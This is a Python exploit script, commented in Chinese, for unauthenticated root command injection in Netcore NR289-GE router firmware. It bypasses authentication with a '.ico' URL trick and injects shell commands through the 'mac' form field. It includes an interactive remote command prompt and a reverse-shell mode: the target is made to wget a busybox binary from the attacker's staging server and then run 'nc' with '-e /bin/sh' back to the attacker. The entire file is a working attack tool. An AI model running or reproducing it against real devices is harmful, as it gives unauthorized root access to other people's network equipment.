#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Netcore NR289-GE (V1.4.5102) 未授权命令注入 EXP
# 链路: boa `.ico` 认证绕过 -> cgitest.cgi location_time.cgi mac 字段命令注入 (root)
# 依赖: requests (pip install requests)
# 用法:
#   python3 exp.py http://192.168.2.250                 -> 交互式命令执行(回显经 /images/ 取回)
#   python3 exp.py http://192.168.2.250 -c "id"         -> 单条命令
#   python3 exp.py http://192.168.2.250 --shell 192.168.2.128 4444
#       -> 反弹 shell (先 ncat -lvnp 4444; 需要同目录下的 busybox.mipseb 做 staging)
#   --mac: 指定一个已被该 AC 绑定的 AP 的 MAC (真实设备需要; 默认 AA:BB:CC:DD:EE:FF 为模拟环境 mock 值)
import sys, os, re, time, argparse, urllib.parse, threading, functools, http.server, socketserver

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    sys.exit("[-] 需要 requests: pip install requests")

OUT_WEB = "/images/nr289_out.txt"      # 回显文件(/images/ 在 boa 免认证白名单内)
OUT_PATH = "/web" + OUT_WEB

def inject(base, mac, cmd, timeout=60):
    """经 .ico 绕过 + location_time.cgi mac 字段注入执行任意命令(无回显, 以副作用为准)"""
    payload = f"{mac}\";{cmd};#"       # 双引号闭合 + ;# 注释掉模板剩余部分
    data = {
        "mac": payload,
        "location_time_enable": "1",
        "location_time": "1",
    }
    url = f"{base}/pwn.ico/location_time.cgi"
    try:
        # body 是 urlencoded 表单; 该固件解析器对 %XX 正常解码
        r = requests.post(url, data=data, timeout=timeout, verify=False)
        return True, f"HTTP {r.status_code}"
    except requests.exceptions.RequestException as e:
        # 注入命令执行后该 CGI 进程可能崩溃/挂起, 响应不可靠 —— 属预期, 以证据文件为准
        return True, f"(响应不可靠, 预期内: {type(e).__name__})"

def exec_cmd(base, mac, cmd):
    ok, msg = inject(base, mac, f"{cmd} >{OUT_PATH} 2>&1")
    if not ok:
        print(f"[-] 注入请求失败: {msg}")
        return
    time.sleep(2)
    try:
        r = requests.get(base + OUT_WEB, timeout=15, verify=False)
        out = r.text if r.status_code == 200 else f"[-] 取回输出失败 HTTP {r.status_code}"
    except requests.exceptions.RequestException as e:
        out = f"[-] 取回输出失败: {e}"
    print(out.rstrip() if out.strip() else "(无输出)")

class _Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a):
        pass

def stage_server(directory, port):
    handler = functools.partial(_Quiet, directory=directory)
    httpd = socketserver.TCPServer(("0.0.0.0", port), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target", help="如 http://192.168.2.250")
    ap.add_argument("--mac", default="AA:BB:CC:DD:EE:FF",
                    help="已被 AC 绑定的 AP 的 MAC (只需前 6 字节匹配)")
    ap.add_argument("-c", "--cmd", help="执行单条命令后退出")
    ap.add_argument("--shell", nargs=2, metavar=("LHOST", "LPORT"), help="反弹 shell")
    ap.add_argument("--stage-port", type=int, default=58081, help="busybox staging HTTP 端口")
    a = ap.parse_args()
    base = a.target.rstrip("/")
    mac = a.mac

    if a.shell:
        lhost, lport = a.shell
        bb = os.path.join(os.path.dirname(os.path.abspath(__file__)), "busybox.mipseb")
        if not os.path.exists(bb):
            sys.exit("[-] 缺少 busybox.mipseb (MIPS 大端静态 busybox, 放在 exp.py 同目录)")
        stage_server(os.path.dirname(bb), a.stage_port)
        print(f"[*] staging server: http://{lhost}:{a.stage_port}/busybox.mipseb")
        for cmd in (f"wget http://{lhost}:{a.stage_port}/busybox.mipseb -O /tmp/busybox",
                    "chmod 777 /tmp/busybox"):
            ok, msg = inject(base, mac, cmd)
            print(f"[*] {cmd[:40]}... -> {msg}")
            time.sleep(2)
        ok, msg = inject(base, mac, f"/tmp/busybox nc {lhost} {lport} -e /bin/sh")
        print("[+] 反弹包已发送, 检查监听端口" if ok else f"[-] 失败: {msg}")
        return

    if a.cmd:
        exec_cmd(base, mac, a.cmd)
        return

    print("[*] 进入交互模式, 输入命令执行 (exit 退出)")
    while True:
        try:
            cmd = input("rce> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if cmd.lower() in ("exit", "quit"):
            break
        if cmd:
            exec_cmd(base, mac, cmd)

if __name__ == "__main__":
    main()
